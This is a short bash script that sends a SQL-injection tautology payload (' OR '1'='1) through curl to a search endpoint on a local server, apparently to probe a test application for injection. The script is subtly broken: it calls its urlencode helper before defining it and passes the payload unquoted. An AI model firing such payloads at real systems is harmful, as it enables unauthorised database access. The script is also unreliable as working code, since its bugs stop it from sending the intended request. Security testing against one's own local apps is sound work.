#!/usr/bin/env bash
BASE="http://127.0.0.1:3000"
PAYLOAD="' OR '1'='1"
curl -s "${BASE}/search?q=$(urlencode ${PAYLOAD})" || true
# helper urlencode (POSIX)
urlencode() { python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1"; }
